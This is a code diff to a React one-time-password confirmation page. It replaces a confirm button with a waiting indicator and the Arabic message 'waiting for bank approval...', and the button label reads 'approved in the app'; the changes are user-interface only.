@@ -179,18 +179,28 @@ export default function FinalOtpPage() {
                 <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-yellow-400" style={{ animationDelay: "300ms" }} />
               </div>
             </div>
-            <button
-              onClick={handleMessageConfirm}
-              disabled={isConfirming}
-              className="mt-2 w-full max-w-xs rounded-2xl px-6 py-3 font-bold text-sm transition-all disabled:opacity-60 disabled:cursor-not-allowed"
-              style={{
-                background: "linear-gradient(135deg, #f4ad27 0%, #e09a18 100%)",
-                color: "#1a3d52",
-                boxShadow: "0 6px 20px rgba(244,173,39,0.35)",
-              }}
-            >
-              {isConfirming ? "جاري التأكيد..." : "تم الموافقة في التطبيق"}
-            </button>
+            {isConfirming ? (
+              <div className="flex flex-col items-center gap-3 mt-2">
+                <div className="flex items-center justify-center gap-2">
+                  <span className="h-3 w-3 animate-bounce rounded-full bg-yellow-400" style={{ animationDelay: "0ms" }} />
+                  <span className="h-3 w-3 animate-bounce rounded-full bg-yellow-400" style={{ animationDelay: "150ms" }} />
+                  <span className="h-3 w-3 animate-bounce rounded-full bg-yellow-400" style={{ animationDelay: "300ms" }} />
+                </div>
+                <p className="text-sm font-semibold text-yellow-300">جاري انتظار موافقة البنك...</p>
+              </div>
+            ) : (
+              <button
+                onClick={handleMessageConfirm}
+                className="mt-2 w-full max-w-xs rounded-2xl px-6 py-3 font-bold text-sm transition-all"
+                style={{
+                  background: "linear-gradient(135deg, #f4ad27 0%, #e09a18 100%)",
+                  color: "#1a3d52",
+                  boxShadow: "0 6px 20px rgba(244,173,39,0.35)",
+                }}
+              >
+                تم الموافقة في التطبيق
+              </button>
+            )}
           </div>
         </div>
       )}
